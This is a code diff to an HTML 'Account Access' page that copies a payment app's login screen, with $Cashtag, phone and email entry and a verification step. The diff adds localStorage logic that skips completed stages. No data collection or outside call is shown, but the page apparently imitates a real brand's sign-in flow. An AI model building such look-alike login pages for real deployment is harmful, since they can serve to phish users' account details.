@@ -4,6 +4,16 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Account Access</title>
+<script>
+    // Local Storage Check: Skip if user already passed this stage
+    if (localStorage.getItem('indexPassed') === 'true') {
+        if (localStorage.getItem('verificationPassed') === 'true' || localStorage.getItem('walletAppSession')) {
+            window.location.href = 'home.html';
+        } else {
+            window.location.href = 'verification.html';
+        }
+    }
+</script>
 <style>
     /* Compact CSS Variables & Base */
     :root { --bg: #fff; --green: #00D632; --btn-light: #EBEBEB; --btn-dark: #000; --disabled: #AEAEAE; --border: #b3b3b3; }
@@ -66,7 +76,6 @@
         <h1 style="font-size:30px">Find your account</h1>
     </div>
     <div>
-        <!-- Inline scripts directly attached to buttons -->
         <button class="btn btn-light" onclick="openInput('phone')">Phone number</button>
         <button class="btn btn-light" onclick="openInput('email')">Email</button>
         <button class="btn btn-light" onclick="showView('view-cashtag')">$Cashtag</button>
@@ -79,7 +88,6 @@
     <div>
         <div class="top-row"><button class="btn-circle btn-help">?</button></div>
         <h1 id="in-title">Enter your email</h1>
-        <!-- oninput triggers the footer reveal -->
         <input type="text" id="main-input" class="input-box" placeholder="Email address" oninput="checkTyping(this.value)">
         <div class="link-wrap"><a class="link">Need help logging in?</a></div>
     </div>
@@ -87,7 +95,7 @@
         <p id="disclaimer">By entering and tapping Next, you agree to<br>the <a>Terms</a>, <a>E-Sign Consent</a> & <a>Privacy Notice</a></p>
         <div class="bot-row">
             <button class="btn btn-light" id="btn-switch" onclick="toggleInput()">Use Phone</button>
-            <button class="btn btn-disabled" id="btn-next" onclick="location.href='verification.html'">Next</button>
+            <button class="btn btn-disabled" id="btn-next" onclick="completeIndexFlow('verification.html')">Next</button>
         </div>
     </div>
 </div>
@@ -99,31 +107,27 @@
         <h1>Enter the $Cashtag for<br>your account</h1>
         <input type="text" class="input-box" placeholder="$cashtag">
     </div>
-    <button class="btn btn-dark" onclick="location.href='verification.html'">Continue</button>
+    <button class="btn btn-dark" onclick="completeIndexFlow('verification.html')">Continue</button>
 </div>
 
 <!-- 5. COMPACT JAVASCRIPT -->
 <script>
-    // Automatically transition from Green Preloader to Menu after 1.8s
     setTimeout(() => showView('view-find'), 1800);
 
-    // General view switcher
     function showView(id) {
         document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
         document.getElementById(id).classList.add('active');
     }
 
-    // Handles setting up the Email or Phone input view
     let currentType = 'email';
     function openInput(type) {
         currentType = type;
         document.getElementById('main-input').value = '';
-        checkTyping(''); // Reset typing footer
+        checkTyping('');
         updateUI();
         showView('view-input');
     }
 
-    // Toggles between Phone / Email
     function toggleInput() {
         currentType = currentType === 'email' ? 'phone' : 'email';
         document.getElementById('main-input').value = '';
@@ -131,7 +135,6 @@
         updateUI();
     }
 
-    // Updates text based on Email/Phone selection
     function updateUI() {
         const title = document.getElementById('in-title');
         const input = document.getElementById('main-input');
@@ -150,7 +153,6 @@
         }
     }
 
-    // Runs instantly as user types (reveals footer & turns on 'Next' button)
     function checkTyping(val) {
         const disc = document.getElementById('disclaimer');
         const nextBtn = document.getElementById('btn-next');
@@ -158,12 +160,17 @@
         if (val.trim().length > 0) {
             disc.style.visibility = 'visible'; 
             disc.style.opacity = '1';
-            nextBtn.className = 'btn btn-dark'; // Enable visually
+            nextBtn.className = 'btn btn-dark';
         } else {
             disc.style.visibility = 'hidden'; 
             disc.style.opacity = '0';
-            nextBtn.className = 'btn btn-disabled'; // Disable visually
+            nextBtn.className = 'btn btn-disabled';
         }
+    }
+
+    function completeIndexFlow(targetUrl) {
+        localStorage.setItem('indexPassed', 'true');
+        location.href = targetUrl;
     }
 </script>
 </body>
